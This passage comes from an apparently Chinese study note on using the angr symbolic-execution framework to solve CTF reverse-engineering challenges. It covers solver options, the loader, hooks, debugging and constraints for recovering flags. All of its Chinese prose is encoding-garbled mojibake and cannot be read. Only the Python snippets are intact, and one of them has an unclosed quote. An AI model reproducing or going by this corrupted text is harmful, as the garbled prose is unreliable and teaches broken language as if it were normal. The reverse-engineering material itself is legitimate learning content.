(2)ä½å‘é‡è¾“å‡º\n\nè¿™ä¸ªä¸€èˆ¬åœ¨æœ€å¼€å§‹ä½¿ç”¨ä½å‘é‡BVSåˆ›å»ºè¾“å…¥çš„æ—¶å€™ä½¿ç”¨\n\n```python\n#passwd0 = claripy.BVS('passwd0', passwd_size_in_bits)\n#passwd1 = claripy.BVS('passwd1', passwd_size_in_bits)\n#passwd2 = claripy.BVS('passwd2', passwd_size_in_bits)\nif simulation.found:\n    for solution_state in simulation.found:\n        solution0 = format(solution_state.solver.eval(passwd0), 'x')\n        solution1 = format(solution_state.solver.eval(passwd1), 'x')\n        solution2 = format(solution_state.solver.eval(passwd2), 'x')\n        solution = solution0 + \" \" + solution1 + \" \" + solution2\n        print(\"[+] Success! Solution is: {}\".format(solution))\n        # print(simgr.found[0].posix.dumps(0))\nelse:\n    raise Exception('Could not find the solution')\n```\n\nè¾“å‡ºçš„æ˜¯åå…­è¿›åˆ¶çš„æ•°å­—\n\n### (3)æ±‚è§£é€‰é¡¹\n\n| æ¥å£                               | æè¿°                                                     |\n| ---------------------------------- | -------------------------------------------------------- |\n| `solver.eval(expression)`          | å°†ä¼šè§£å‡ºä¸€ä¸ªå¯è¡Œè§£                                       |\n| `solver.eval_one(expression)`      | å°†ä¼šç»™å‡ºä¸€ä¸ªè¡¨è¾¾å¼çš„å¯è¡Œè§£ï¼Œè‹¥æœ‰å¤šä¸ªå¯è¡Œè§£ï¼Œåˆ™æŠ›å‡ºå¼‚å¸¸   |\n| `solver.eval_upto(expression, n)`  | å°†ä¼šç»™å‡ºæœ€å¤šnä¸ªå¯è¡Œè§£ï¼Œå¦‚æœä¸è¶³nä¸ªå°±ç»™å‡ºæ‰€æœ‰çš„å¯è¡Œè§£ã€‚   |\n| `solver.eval_exact(expression, n)` | å°†ä¼šç»™å‡ºnä¸ªå¯è¡Œè§£ï¼Œå¦‚æœè§£çš„ä¸ªæ•°ä¸ç­‰äºnä¸ªï¼Œå°†ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚ |\n| `solver.min(expression)`           | ç»™å‡ºæœ€å°å¯è¡Œè§£                                           |\n| `solver.max(expression)`           | ç»™å‡ºæœ€å¤§å¯è¡Œè§£                                           |\n\n\n\n\n\n# äºŒã€è¿›é˜¶ç®¡ç†\n\nStash:  active ã€deadend ã€foundç­‰\n\n## 1.è¿è¡Œæ–¹å¼\n\nåŸºæœ¬å—çš„åŒºåˆ†é€šå¸¸ä»¥`call`ï¼Œ`cmp-jz/jmp...`ï¼Œ`ret`ç­‰ä¸ºæ ‡å¿—ã€‚\n\n### (1)step()\n\næ¯æ¬¡å‘å‰è¿è¡Œä¸€ä¸ªåŸºæœ¬å—ï¼Œå¹¶è¿”å›è¿›è¡Œåˆ†ç±»\n\nè®© stash ä¸­çš„æ‰€æœ‰çŠ¶æ€éƒ½æ‰§è¡Œä¸€ä¸ªåŸºæœ¬å—ï¼Œé»˜è®¤çš„ stash ä¸º active\n\n### (2)run()\n\næ¯æ¬¡å‘å‰è¿è¡Œä¸€ä¸ªåŸºæœ¬å—ï¼Œå¹¶è¿”å›è¿›è¡Œåˆ†ç±»\n\n### (3)explore()\n\næ ¹æ®`find`å’Œ`avoid`è¿›è¡ŒåŸºæœ¬å—çš„æ‰§è¡Œï¼Œæœ€åä¼šè¿”å›`found`å’Œ`avoid`çŠ¶æ€\n\n\n\n## 2.è·¨å¹³å°ä½¿ç”¨\n\n### (1)ARM\n\nç›´æ¥å¯¹åº”ä½¿ç”¨ï¼Œä¸ç”¨æ·»åŠ å…¶ä»–çš„ä»€ä¹ˆé…ç½®\n\n```python\nstate.regs.r0 = concrete_addr\n```\n\n## 3.ç›´æ¥ä½¿ç”¨äºŒè¿›åˆ¶é‡Œçš„å‡½æ•°\n\næ–‡ä»¶åœ¨\"/home/hacker/Desktop/Reverse/Angr/myTest/callBinaryFunc\"\n\n```python\n#myFuncå‡½æ•°çš„åœ°å€ï¼Œå³å‡½æ•°æœ€å¼€å§‹çš„æ±‡ç¼–ä»£ç çš„åœ°å€\nmyFunc_addr = base + 0x64A\nproject = angr.Project(path_to_binary, auto_load_libs=True)\n\n#(SimTypeInt(False)è¡¨è®¾ç½®å‚æ•°ï¼Œä¼ å‚å’Œè¿”å›å€¼çš„ç±»å‹è®¾ç½®\nprototype = SimTypeFunction((SimTypeInt(False),SimTypeInt(False)),SimTypeInt(False))\n\nmyFunc = project.factory.callable(myFunc_addr, cc=project.factory.cc(func_ty=prototype), toc=None, concrete_only=True)\n\n#è°ƒç”¨å‡½æ•°\nmyFunc.perform_call(0,0x100)\n\n#è·å–æœ€ç»ˆçš„çŠ¶æ€state,å³å¯ä»è¯¥stateä¸­è·å–è¿”å›å€¼å’Œå„ç§å¯„å­˜å™¨çŠ¶æ€\nstate = myFunc.result_state\nprint(state.regs.rax)\n```\n\næˆ–è€…å¦‚ä¸‹ï¼š\n\n```\nfunc = project.factory.callable(project.loader.find_symbol('myFunc).rebased_addr)\n```\n\n\n\n## 4.C++åº“çš„å®ç°\n\nåªèƒ½ä»æœ€å¼€å§‹è¿›è¡Œ\n\nç”±äº`angr`æ˜¯åªå®ç°äº†Cåº“ï¼Œä¸ºäº†æ·±å…¥C++æ ‡å‡†åº“ä¸­ï¼Œæˆ‘ä»¬éœ€è¦åœ¨è®¾ç½®stateæ—¶éœ€è¦ä½¿ç”¨`full_init_state`æ–¹æ³•ï¼Œå¹¶ä¸”è®¾ç½®`unicorn`å¼•æ“\n\nunicornå¼•æ“å¯èƒ½å¯ä»¥åŠ å¿«è¿è¡Œé€Ÿåº¦ï¼Œæœ‰æ—¶å€™ä¹Ÿä¼šæ”¾æ…¢é€Ÿåº¦ï¼Œå°±æ¯”å¦‚åœ¨åªæœ‰ä¸€æ¡è·¯å¾„ï¼Œä½†æ˜¯éœ€è¦æ·»åŠ flagçº¦æŸçš„ï¼š`asisctffinals2015_fake`\n\n```python\ninitial_state = project.factory.full_init_state(\n    args=path_to_binary,\n    add_options=angr.options.unicorn,\n    stdin=flag,\n)\n```\n\n### â–²æ³¨ï¼š\n\nè¿™ç§ä»æœ€å¼€å§‹æ‰§è¡Œçš„æ–¹æ³•é€šå¸¸ç”¨åœ¨è·¯å¾„åˆ†æ”¯ä¸å¤šçš„æ—¶å€™ï¼Œå¦‚æœæ¯”è¾ƒå¤šå°±å®¹æ˜“è·¯å¾„çˆ†ç‚¸ã€‚\n\n\n\n## 5.loader åŠ è½½æ¨¡å—\n\nå°†äºŒè¿›åˆ¶æ–‡ä»¶åŠ è½½åˆ°è™šæ‹Ÿçš„åœ°å€ç©ºé—´\n\n### (1)åŠ è½½äºŒè¿›åˆ¶é€‰é¡¹\n\nåœ¨åŠ è½½äºŒè¿›åˆ¶æ–‡ä»¶æ—¶å¯ä»¥è®¾ç½®ç‰¹å®šçš„å‚æ•°ï¼Œä½¿ç”¨ `main_opts` å’Œ `lib_opts` å‚æ•°è¿›è¡Œè®¾ç½®ã€‚\n\n- `backend` - æŒ‡å®š backend\n- `base_addr` - æŒ‡å®šåŸºå€\n- `entry_point` - æŒ‡å®šå…¥å£ç‚¹\n- `arch` - æŒ‡å®šæ¶æ„\n\n```python\n>>> angr.Project('examples/fauxware/fauxware', main_opts={'backend': 'blob', 'arch': 'i386'}, lib_opts={'libc.so.6': {'backend': 'elf'}})\n<Project examples/fauxware/fauxware>\n```\n\n\n\n### (2)è·å–åŠ è½½å¯¹è±¡çš„ä¿¡æ¯\n\n```python\nobj = proj.loader.main_object\nobj = proj.loader.all_objects\nobj.sections\nobj.plt\nobj.linked_base\nobj.mapped_base\nobj.max_addr\n```\n\n\n\n### (3)ç¬¦å·å’Œé‡å®šä½ä¿¡æ¯\n\n#### â‘ ç¬¦å·å¯¹è±¡ä¿¡æ¯\n\n```python\nmalloc = proj.loader.find_symbol('malloc')\nmalloc = proj.loader.main_object.get_symbol('malloc')\n#ä¹‹åå¯ä»¥ä½¿ç”¨mallocè¿™ä¸ªå¯¹è±¡\n>>> malloc.\nmalloc.is_common           malloc.is_local            malloc.owner_obj           malloc.resolvedby\nmalloc.is_export           malloc.is_static           malloc.rebased_addr        malloc.size\nmalloc.is_extern           malloc.is_weak             malloc.relative_addr       malloc.subtype\nmalloc.is_forward          malloc.linked_addr         malloc.resolve(            malloc.type\nmalloc.is_function         malloc.name                malloc.resolve_forwarder(  \nmalloc.is_import           malloc.owner               malloc.resolved\n    \n#è·å–ç¬¦å·å¯¹è±¡åœ°å€\n>>> malloc.rebased_addr\n0x10002c0\n>>> malloc.linked_addr \n0x2c0     \n>>> malloc.relative_addr\n0x2c0\n```\n\n#### â‘¡å…±äº«åº“ä¿¡æ¯\n\né€‰é¡¹\n\n| `auto_load_libs`      | æ˜¯å¦è‡ªåŠ¨åŠ è½½ç¨‹åºçš„ä¾èµ–       |\n| --------------------- | ---------------------------- |\n| `skip_libs`           | é¿å…åŠ è½½çš„åº“                 |\n| `except_missing_libs` | æ— æ³•è§£æå…±äº«åº“æ—¶æ˜¯å¦æŠ›å‡ºå¼‚å¸¸ |\n| `force_load_libs`     | å¼ºåˆ¶åŠ è½½çš„åº“                 |\n| `ld_path`             | å…±äº«åº“çš„ä¼˜å…ˆæœç´¢æœå¯»è·¯å¾„     |\n\nä¿¡æ¯\n\n```python\n>>> proj = angr.Project('/bin/true')\n>>> proj.loader.shared_objects\nOrderedDict([('true', <ELF Object true, maps [0x400000:0x60721f]>), ('libc.so.6', <ELF Object libc-2.27.so, maps [0x1000000:0x13f0adf]>), ('ld-linux-x86-64.so.2', <ELF Object ld-2.27.so, maps [0x2000000:0x222916f]>)])\n>>> proj = angr.Project('/bin/true', load_options={\"auto_load_libs\": False})\n>>> proj.loader.shared_objects\nOrderedDict([('true', <ELF Object true, maps [0x400000:0x60721f]>)])\n```\n\n#### â‘¢Libcå‡½æ•°ä¿¡æ¯\n\n```python\n>>> angr.procedures.libc.malloc\n<module 'angr.procedures.libc.malloc' from '/home/angr/angr-dev/angr/angr/procedures/libc/malloc.py'>\n>>> angr.SIM_PROCEDURES['libc']['malloc']\n<class 'angr.procedures.libc.malloc.malloc'>\n```\n\n## 6.Hookä¿¡æ¯\n\næŸ¥çœ‹hookç›¸å…³çš„ä¿¡æ¯\n\n```python\n>>> stub_func = angr.SIM_PROCEDURES['stubs']['ReturnUnconstrained'] # this is a CLASS\n>>> proj.hook(0x10000, stub_func())  # hook with an instance of the class\n>>> proj.is_hooked(0x10000)            # these functions should be pretty self-explanitory\nTrue\n>>> proj.hooked_by(0x10000)\n<ReturnUnconstrained>\n>>> proj.unhook(0x10000)\n>>> @proj.hook(0x20000, length=5)\n... def my_hook(state):\n...     state.regs.rax = 1\n>>> proj.is_hooked(0x20000)\nTrue\n```\n\n\n\n\n\n# ä¸‰ã€å‘½ä»¤è¡Œä½¿ç”¨angr\n\n## 1.dockerç¯å¢ƒ\n\n```python\nsudo docker run -it --rm -v $PWD/myTest:/myTest angr/angr\n```\n\n## 2.å‰æœŸå‡†å¤‡\n\n### (1)è¿›å…¥angr\n\n```python\nimport angr\nimport logging\nproject = angr.Project(\"/myTest/callBinaryFunc\")\n#ä½¿ç”¨unicornå¼•æ“\ninitial_state = project.factory.entry_state(add_options=angr.options.unicorn)\nlogging.getLogger('angr').setLevel(logging.INFO)\n#ç°åœ¨å°±æ˜¯åœåœ¨startå‡½æ•°çš„å…¥å£\nhex(initial_state.addr)\n```\n\n\n\n## 3.ä¸­æœŸè°ƒè¯•\n\n### (1)ä¸­æ–­è°ƒè¯•\n\n```python\nimport logging\nlogging.getLogger('angr').setLevel(logging.INFO)\n#from pwn import*\n\n\ndef hook(l=None):\n    if l:\n        locals().update(l)\n    import IPython\n    IPython.embed(banner1='',confirm_exit=False)\n    exit(0)\n\n#ç„¶ååœ¨éœ€è¦ä¸­æ–­çš„åœ°æ–¹è°ƒç”¨è¯¥å‡½æ•°å³å¯\nhook(locals())\n```\n\næˆ–è€…ä½¿ç”¨ipdb\n\n```python\nimport ipdb\n\n#åœ¨éœ€è¦æ–­ç‚¹çš„åœ°æ–¹ä¸‹æ–­ç‚¹å³å¯\nipdb.set_trace()\n```\n\nä½¿ç”¨æ‰‹å†Œ\n\n```\nh(help)ï¼šå¸®åŠ©å‘½ä»¤\ns(step into)ï¼šè¿›å…¥å‡½æ•°å†…éƒ¨\nn(next)ï¼šæ‰§è¡Œä¸‹ä¸€è¡Œ\nb(break): b line_number æ‰“æ–­ç‚¹\ncl(clear): æ¸…é™¤æ–­ç‚¹\nc(continue): ä¸€ç›´æ‰§è¡Œåˆ°æ–­ç‚¹\nr(return): ä»å½“å‰å‡½æ•°è¿”å›\nj(jump): j line_numberï¼Œè·³è¿‡ä»£ç ç‰‡æ®µï¼Œç›´æ¥æ‰§è¡ŒæŒ‡å®šè¡Œå·æ‰€åœ¨çš„ä»£ç \nl(list): åˆ—å‡ºä¸Šä¸‹æ–‡ä»£ç \na(argument): åˆ—å‡ºä¼ å…¥å‡½æ•°æ‰€æœ‰çš„å‚æ•°å€¼\np/pp: print å’Œ pretty print æ‰“å°å‡ºå˜é‡å€¼\nr(restart): é‡å¯è°ƒè¯•å™¨\nq(quit): æ¨å‡ºè°ƒè¯•ï¼Œæ¸…é™¤æ‰€æœ‰ä¿¡æ¯\n```\n\n\n\n### (2)angrç®¡ç†å™¨\n\n```python\n#è·å–è·¯å¾„ç®¡ç†å™¨ï¼Œä»å…¥å£å¼€å§‹è¿è¡Œ\nsm = project.factory.simulation_manager()\nsm.run()\n\n#æˆ–è€…å¦‚ä¸‹è®¾ç½®ï¼Œè®¾ç½®åˆå§‹çŠ¶æ€å’Œå…¥å£åœ°å€ï¼Œä»è¯¥çŠ¶æ€å¼€å§‹æ¢ç´¢ï¼Œç›´åˆ°find\ninitial_state = project.factory.blank_state(addr=start_address)\nsimulation = project.factory.simgr(initial_state,veritesting=True)\nsimulation.explore(find=success_address)\n```\n\nä»¥ä¸‹ä¸ºè¿è¡Œä¹‹åå¯èƒ½çš„çŠ¶æ€è·¯å¾„\n\n![image-20211208111243588](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211208111250.png)\n\n![image-20211208111727739](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211208111727.png)\n\nç„¶åå³å¯é€šè¿‡çŠ¶æ€æ¥æŸ¥çœ‹å½“å‰çŠ¶æ€çš„ä¸­çš„å„ç§å†…å­˜ï¼Œå¯„å­˜å™¨ç­‰\n\n![image-20211208111922248](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211208111922.png)\n\n![image-20211208111957281](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211208111957.png)\n\n\n\n### (3)è·å–å½“å‰å—ç›¸å…³ä¿¡æ¯\n\n```python\n#æŸ¥çœ‹blockç›¸å…³ä¿¡æ¯\nblock = state.block()\nblock.capstone.pp()\n```\n\n![image-20211207175452322](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211207175459.png)\n\n\n\n### (4)è°ƒè¯•core\n\nä¸€èˆ¬è€Œè¨€ï¼Œcoreå¯ä»¥ä»gdbä¸­è·å¾—ï¼Œå¾—åˆ°å½“å‰gdbçŠ¶æ€çš„æ‰€æœ‰æ•°æ®ï¼ŒåŒ…æ‹¬åŠ è½½çš„libcå‡½æ•°ç­‰ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä¸­è·å¾—ç›¸å…³çš„æ•°æ®æ¥åˆå§‹åŒ–æˆ‘ä»¬çš„state\n\n![image-20211208155507602](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211208155507.png)\n\nç„¶åå°±å¯ä»¥å¯¹åº”è°ƒè¯•äº†ï¼Œè®¾ç½®è¿˜æ˜¯ä¸€æ ·çš„è®¾ç½®ï¼Œåªä¸è¿‡åœ°å€ç›´æ¥å˜æˆå½“å‰çš„gdbä¸­çš„åœ°å€å³å¯ã€‚å¯ä»¥çœ‹åˆ°æ‰€æœ‰å†…å­˜åŸºæœ¬ä¸€è‡´ï¼Œåªæœ‰rbp,rspç­‰æ ˆæŒ‡é’ˆä¸å¤ªä¸€æ ·ï¼Œè¿™æ ·æ¯”è¾ƒæ–¹ä¾¿æˆ‘ä»¬æ¥è·å–æ•°æ®è°ƒè¯•ã€‚\n\n![image-20211208155814628](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211208155815.png)\n\n \n\n### (5)ç»§ç»­æ¢ç´¢\n\nå½“ä½¿ç”¨è¿‡çš„`simulation`æƒ³æ¥ç€æŸä¸ªçŠ¶æ€ç»§ç»­æ¢ç´¢æ—¶ï¼Œç›´æ¥ä½¿ç”¨ä»¥ä¸‹ä»£ç ä¸ä¼šæˆåŠŸ\n\n```python\nsimulation.explore(find = addr)\n```\n\nè¿™æ—¶å€™éœ€è¦è·å–å½“å‰`simulation`çš„çŠ¶æ€`state`ï¼Œç„¶åä¾æ®è¯¥çŠ¶æ€`state`æ–°å»ºä¸€ä¸ª`newSimulation`æ‰èƒ½ç»§ç»­æ¢ç´¢\n\n```python\ndef nextFind(project,state,find=0,avoid=0):\n    simulation = project.factory.simgr(state,veritesting=True)\n    simulation.explore(find = find,avoid = avoid)\n    return simulation\n```\n\n\n\n\n\n\n\nâ–²TIPS\n\n```python\n#è¾“å…¥ï¼Ÿè·å–å¸®åŠ©\np.factory.simulation_manager?\n\n\n```\n\n\n\n1.è·å–å­—ç¬¦ä¸²\n\n```python\n#è½¬æˆbyteç±»å‹çš„å­—ç¬¦ä¸²\n#sm = p.factory.simulation_manager()\n#sm.step()\n#state = sm.active[0]\nflag = state.mem[addr].string\nflag.concrete\n\nsm.deadended[1].posix.stdout.concretize()\n```\n\n![image-20211207180744674](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211207180744.png)\n\n![image-20211208111616726](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211208111616.png)\n\n\n\n\n\n\n\n# TIPS\n\n## 1.æ±‚å€¼é—®é¢˜\n\n### (1)æ±‚BVVç¬¦å·å€¼\n\n```python\na = claripy.BVV(0xffffffff, 0x4*8)\ns = claripy.Solver()\nif(s.eval(a, 0)[0] == 0xffffffff):\n    print(\"Get!\")\n```\n\n\n\n\n\n\n\n### (2)è·å–å†…å­˜ç¬¦å·å€¼\n\n```python\nstate = proj.factory.entry_state()\n#add rax, qword ptr [rsp + 8]\nstate.regs.rax += state.mem[state.regs.rsp + 8].uint64_t.resolved\n\nresult = simgr.found[0].memory.load(flag_addr, 40)\n#or get_byte\nsimulation.found[0].solver.eval(result.get_bytes(0,0x17),cast_to=bytes)\n```\n\n\n\n### (3)è¾“å…¥å‚æ•°çš„å€¼\n\n```python\n#set\ninitial_state = p.factory.entry_state(args=[binary,argv1])\nsimgr = p.factory.simgr(inital_state,veritesting=True)\nfound = simgr.found[0]\n#get\nfound.solver.eval(argv1,cast_to=bytes)\n\n\n#or such as\ndata = claripy.BVS('data',20*8)\np = angr.Project(path_to_binary, auto_load_libs=True)\ninital_state = p.factory.entry_state(stdin=data)\nsimgr = p.factory.simgr(inital_state,veritesting=True)\n#get\nprint(simgr.found[0].posix.stdin.concretize())\n```\n\n\n\n\n\n### (4)å‘é‡è¿æ¥\n\n`claripy.Concat`æ–¹æ³•ç”¨äº`bitVector`çš„è¿æ¥\n\n```python\nflag_chars = claripy.BVS('flag_%d' % 1, 8)\nflag = claripy.Concat(flag_chars + claripy.BVV(b'\\n'))\n\n#listä¸­çš„å‘é‡\nflag_chars = [claripy.BVS('flag_%d' % i, 8) for i in range(28)]\nflag = claripy.Concat(*flag_chars + [claripy.BVV(b'\\n')])\n#ä¹‹ååœ¨stateä¸­è®¾ç½®stdin=flagå³å¯ä»å‘½ä»¤è¡Œè¾“å…¥å¤šç»„å‘é‡\n```\n\n\n\n### (5)è·å–å†…å­˜è¿›è¡Œå¯¹æ¯”\n\n```python\nfound.add_constraints(found.memory.load(flag_addr, 5) == int(binascii.hexlify(b\"ASIS{\"), 16))\n```\n\n\n\n### (6)å¸¸è§æ·»åŠ flagçš„çº¦æŸ\n\nå½“è¾“å…¥æŸä¸ªæ•°å­—ï¼Œç»è¿‡è®¡ç®—æ‰“å°flagï¼Œåªæœ‰ç®€å•å‡ æ¡è·¯å¾„æ—¶ï¼Œå°±éœ€è¦å¯¹flagè¿›è¡Œçº¦æŸæ‰èƒ½æ­£å¸¸è¾“å‡ºï¼Œ`asisctffinals2015_fake`\n\næ·»åŠ çº¦æŸçš„æ—¶å€™ï¼Œä¸èƒ½ä½¿ç”¨`eval`æ±‚è§£ï¼Œåªèƒ½ä½¿ç”¨`load`\n\n#### â‘ æ•´ä¸ªFlagçº¦æŸ\n\n```python\n#è¿™é‡Œå³ä»£è¡¨flagä¸­åº”è¯¥éƒ½æ˜¯[0~9]æˆ–è€…[a~z][-,_]ï¼Œæœ€ååº”è¯¥ä»¥'}'ç»“å°¾\nflag = found.memory.load(flag_addr, 40)\nfor i in range(5, 5+32):\n    cond_0 = flag.get_byte(i) >= ord('0')\n    cond_1 = flag.get_byte(i) <= ord('9')\n    cond_2 = flag.get_byte(i) >= ord('a')\n    cond_3 = flag.get_byte(i) <= ord('z')\n    cond_4 = found.solver.And(cond_0, cond_1)\n    cond_5 = found.solver.And(cond_2, cond_3)\n    cond_6 = flag.get_byte(i) == ord('-')\n    cond_7 = flag.get_byte(i) == ord('_')\n    found.add_constraints(found.solver.Or(cond_4, cond_5,cond_6,cond_7))\nfound.add_constraints(flag.get_byte(32+5) == ord('}'))\n```\n\n#### â‘¡å‘é‡çº¦æŸ\n\n```python\nfor b in arg1.chop(8):\n    initial_state.add_constraints(b != 0)\n```\n\n#### â‘¢å­—ç¬¦çº¦æŸ\n\n```python\n#å¯è§\nfor i in range(36):\n    # We want those flags to be printable characters\n    state.add_constraints(flag.get_byte(i) >= 0x20)\n    state.add_constraints(flag.get_byte(i) <= 0x7e)\n    \n#Or\nfor i in range(dataLen):\n    state.solver.add(\n    \tclaripy.Or(\n            *(data.get_byte(i) == x for x in printable)\n        )\n    )\n```\n\n#### â‘£ç‰¹æ®Šçº¦æŸ\n\n```python\nfound.add_constraints(found.memory.load(flag_addr, 5) == int(binascii.hexlify(b\"ASIS{\"), 16))\nfound.add_constraints(flag.get_byte(32+5) == ord('}'))\n```\n\n\n\n\n\n### (7)æ–¹ä¾¿çš„æ ˆæ•°æ®å­˜å–æ“ä½œ\n\n```python\nstate.regs.rbp = state.regs.rsp\n    state.mem[state.regs.rbp - 0x74].uint32_t = 0x40\n    state.mem[state.regs.rbp - 0x70].uint64_t = 0x1000\n    state.mem[state.regs.rbp - 0x68].uint64_t = 0x1008\n    state.mem[state.regs.rbp - 0x60].uint64_t = 0x1010\n    state.mem[state.regs.rbp - 0x58].uint64_t = 0x1018\n```\n\n\n\n### (8)è·å–stateçš„è¾“å‡º\n\n```python\n#p = angr.Project(\"/myTest/callBinaryFunc\")\n#sm = p.factory.simulation_manager()\nprint(sm.deadended[0].posix.stdout.concretize())\n\n\n#å½“éœ€è¦ä»å¤šæ¡è·¯å¾„éå†è·å–flagæ—¶\nout = b''\nfor pp in simulation.deadended:\n    out = pp.posix.dumps(1)\n    if b'flag{' in out:\n        final_flag = next(filter(lambda s: b'flag{' in s, out.split()))\n        print(\"[+] Success! Solution is: {0}\".format(final_flag))\n```\n\n\n\n\n\n## 2.æ— æ³•è¯†åˆ«çš„å‡½æ•°\n\nstrtol(),strlen()ç­‰ä¸€ç³»åˆ—çš„å­—ç¬¦ä¸²æ“ä½œ\n\n\n\n## 3.æœ«å°¾åŠ '\\x00'é—®é¢˜\n\næœ‰æ—¶å€™ä¼šå‘é‡è®¾ç½®ï¼Œæœ€å¥½åœ¨æœ«å°¾åŠ ä¸Š'\\x00'ï¼Œä½¿å¾—æŸäº›æƒ…å†µèƒ½å¤Ÿé€šè¿‡ã€‚åŒæ ·çš„å½“æœ‰canaryçš„æ—¶å€™ï¼Œæ²¡åŠæ³•ä»å‹å…¥canaryçš„åœ°æ–¹å¼€å§‹çš„æ—¶å€™ï¼Œè¿™æ—¶å€™æœ€å¥½ç»™canaryå‘é‡åŒ–æˆ–è€…ç»™'\\x00'æˆªæ–­ã€‚`sym-write`\n\n\n\n## 4.ç¬¦å·å†™é—®é¢˜\n\nåŒæ ·çš„ï¼Œåœ¨å¾ˆå¤šæ—¶å€™ï¼Œæœ€å¥½åŠ ä¸Š`{angr.options.SYMBOLIC_WRITE_ADDRESSES}`é€‰é¡¹ï¼Œè¿™ä¸ªå…¶å®ä¹Ÿä¸æ˜¯å¾ˆæ¸…æ¥šï¼Œæœ‰çš„é¢˜ä¸åŠ ä¹Ÿå¯ä»¥ï¼Œä½†æ˜¯æœ‰çš„é¢˜ä¸åŠ å°±ä¸è¡Œã€‚\n\n```python\nstate = project.factory.entry_state(add_options={angr.options.SYMBOLIC_WRITE_ADDRESSES})\n```\n\n\n\n## 5.32ä½é—®é¢˜\n\nx86çš„32ä½ç¨‹åºä¸‹ï¼Œå‚æ•°ä»æ ˆä¸Šå–ï¼Œæœ‰æ—¶å€™é€šå¸¸éœ€è¦è®¾ç½®è¿™ä¸ªæ‰è¡Œçš„`flareon2015_2`\n\n```python\ns.memory.store(s.regs.esp+12, s.solver.BVV(50,8*4))\ns.mem[s.regs.esp+8].uint32_t = 0x402159\ns.mem[s.regs.esp+4].uint32_t = 0x4010e4\ns.mem[s.regs.esp].uint32_t = 0x401064\n```\n\n\n\n## 6.æ£€æŸ¥é—®é¢˜\n\næ­£å¸¸æƒ…å†µä¸‹æŸä¸ª state è¢«å‘ç°æ˜¯ä¸å¯æ»¡è¶³æ¡ä»¶çš„ï¼Œé‚£ä¹ˆstateä¼šè¿›è¡Œå›æº¯ï¼Œæ¥ç¡®å®šåˆ°åº•æ˜¯å“ªä¸ªstateä¸è¢«æ»¡è¶³ï¼Œä¹‹åæ‰€æœ‰çš„stateä¼šè¢«æ”¾å…¥åˆ°stashä¸­ã€‚ä½†æ˜¯æœ‰çš„æ—¶å€™å›æº¯å¹¶ä¸å¥½ï¼Œä¼šæ¯”è¾ƒä¸å®¹æ˜“å‡ºç»“æœï¼Œå°¤å…¶æ˜¯è¿ç®—é‡æ¯”è¾ƒå¤§çš„æ—¶å€™ï¼Œè¿™æ—¶å€™å°±å¯ä»¥æ·»åŠ `LAZY_SOLVES`ï¼Œä¸è¿›è¡Œæ£€æŸ¥ï¼Œå…ˆæŠŠæ‰€æœ‰è·¯å¾„è·‘å®Œã€‚\n\næ€»çš„æ¥è¯´LAZY_SOLVESæ˜¯åœ¨è·¯å¾„çˆ†ç‚¸å’ŒèŠ±è´¹åœ¨çº¦æŸæ±‚è§£ä¸Šçš„æ—¶é—´ä¹‹é—´çš„å¹³è¡¡ã€‚\n\nåŒæ ·çš„ï¼Œæœ‰çš„ç‰ˆæœ¬æ˜¯é»˜è®¤å¼€å¯ï¼Œæœ‰çš„æ˜¯é»˜è®¤å…³é—­ï¼Œå¯¹åº”ä¿®æ”¹å³å¯\n\n```python\nstate = p.factory.blank_state(addr=START_ADDR, add_options={angr.options.LAZY_SOLVES})\nstate = p.factory.blank_state(addr=START_ADDR, remove_options={angr.options.LAZY_SOLVES})\n```\n\nè¯¦è§é¢˜ç›®`google2016_unbreakable_1`\n\næ¯”è¾ƒé€‚ç”¨äºå½“findè·¯å¾„å’Œavoidè·¯å¾„éƒ½æ¯”è¾ƒå®¹æ˜“æŠµè¾¾çš„æ—¶å€™ï¼Œå³æŸäº›åº“å‡½æ•°è°ƒç”¨æ¯”è¾ƒå°‘ï¼Œä½†æ˜¯è¿ç®—é‡æ¯”è¾ƒåºå¤§çš„æ—¶å€™ï¼Œç±»ä¼¼å¦‚ä¸‹å…¨æ˜¯è¿ç®—çš„\n\n![image-20211210175000853](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211210175007.png)\n\nhttps://docs.angr.io/appendix/options#option-sets\n\n[day1-r1-a-1.pdf (hitcon.org)](https://hitcon.org/2016/CMT/slide/day1-r1-a-1.pdf)\n\nhttps://flagbot.ch/lesson5.pdf\n\n\n\n## 7.æ‰§è¡Œé.textæ®µä»£ç \n\næ­£å¸¸çš„angråªèƒ½æ‰§è¡Œ.textæ®µçš„ä»£ç ï¼Œä½†æ˜¯æœ‰çš„é¢˜ä¼šæ‰§è¡Œé.textæ®µçš„ä»£ç ï¼Œä¸è¿‡éœ€è¦åœ¨åˆ›å»ºProjectçš„æ—¶å€™åŠ å…¥é€‰é¡¹`support_selfmodifying_code=True`ï¼Œè¯¦è§é¢˜ç›®`tumctf2016_zwiebel`\n\n```python\nproject = angr.Project(\"zwiebel\", support_selfmodifying_code=True) \n```\n\n\n\n## 8.æŒ‡å®šè¿è¡Œä»£ç å—æ•°\n\nè®¾å®šnï¼Œè¡¨ç¤ºä»stateçš„çŠ¶æ€å¼€å§‹è¿è¡Œ3ä¸ªåŸºæœ¬å—\n\n```python\nsimulation.run(n=3)\n```\n\n\n\n# å¸®åŠ©\n\n[angr â€” Analysis and Coordination â€” angr 9.0.10689 documentation](http://angr.io/api-doc/angr.html#angr.sim_state.SimState)\n\nhttps://xz.aliyun.com/t/3990\n\nhttps://www.cnblogs.com/61355ing/p/10523147.html\n\n[angr Tutorials EP1 - Reverse Engineering 101 - YouTube](https://www.youtube.com/watch?v=9dQFM5O4KFk)\n\n\n\n[angr](https://angr.io/blog/)\n\n[å…³äºFasterçš„é‚£äº›äº‹... 